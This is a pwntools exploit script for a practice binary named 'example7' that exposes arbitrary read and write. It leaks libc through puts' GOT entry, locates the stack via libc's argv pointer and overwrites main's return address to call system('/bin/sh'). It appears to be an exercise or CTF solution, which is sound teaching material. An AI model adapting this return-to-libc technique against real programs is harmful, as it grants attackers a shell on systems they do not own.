from pwn import *

e=ELF("./example7")
p=process("./example7")


def arb_read(addr):
	p.recvuntil("2. Arbitrary Write") 
	p.sendline("1")
	p.recvuntil(": ")
	p.sendline("%d"%addr)
	return int(p.recvuntil("\n"), 16)

def arb_write(addr, val):
	p.recvuntil("2. Arbitrary Write")
	p.sendline("2")
	p.recvuntil(": ")
	p.sendline("%d"%addr)
	p.recvuntil(": ")
	p.sendline("%d"%val)

puts_got = e.got['puts']
log.info("puts_got : "+hex(puts_got))
puts_addr = arb_read(puts_got)

log.info("puts : "+hex(puts_addr))

libc = puts_addr - 0x5f140
libc_argv = libc + 0x1b35f0
system = libc + 0x3a940 
binsh = libc + 0x15902b

stack_addr = arb_read(libc_argv)
log.info("stack : "+hex(stack_addr))

main_ret = stack_addr - 0x98
log.info("main_ret : "+hex(main_ret))


arb_write(main_ret, system)
arb_write(main_ret+8, binsh)

p.recvuntil("2. Arbitrary Write")
p.sendline("0")
p.recv(102400)

log.info("get shell")

p.interactive()





# 0005f140 puts@GLIBC_2.0 : 0x5f140 
